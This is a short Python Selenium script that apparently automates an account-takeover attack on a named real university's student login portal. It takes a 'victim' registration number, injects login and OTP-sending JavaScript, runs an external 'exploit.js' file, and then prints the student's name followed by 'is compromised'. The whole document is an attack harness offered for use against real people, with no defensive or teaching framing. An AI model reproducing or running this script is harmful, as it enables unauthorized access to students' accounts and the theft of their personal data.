#!/usr/bin/python3

import time
import emoji
import argparse
from selenium import webdriver

station_parser = argparse.ArgumentParser()
station_parser.add_argument(
    '-r', type=str, default=False, help="Registration Number of Victim")
args = station_parser.parse_args()

reg_number = args.r
driver = webdriver.Chrome('/usr/bin/chromedriver')

login_script = open('login-script.js', 'r')
login_script = str(login_script.read()).replace('reg_number', reg_number)

load_jQuery = open('load-jQuery.js', 'r')
load_jQuery = str(load_jQuery.read())

otp_send = open('otp-send.js', 'r')
otp_send = str(otp_send.read())

driver.get('https://dms.jaipur.manipal.edu/Loginform.aspx')

print('executing login-script')

driver.execute_script(load_jQuery)

driver.execute_script(login_script)

print('login-script executed')

time.sleep(1)

print('executing otp-send')

driver.execute_script(load_jQuery)
time.sleep(1)
driver.execute_script(otp_send)

print('otp-send executed')

exploit = open('exploit.js', 'r')
exploit = str(exploit.read())

print('executing exploit :)')

driver.execute_script(load_jQuery)
driver.execute_script(exploit)

victim = driver.find_element_by_id(
    'ContentPlaceHolder1_txtStudentName').get_attribute('value')

print(emoji.emojize('{} is compromised :thumbs_up:').format(victim))
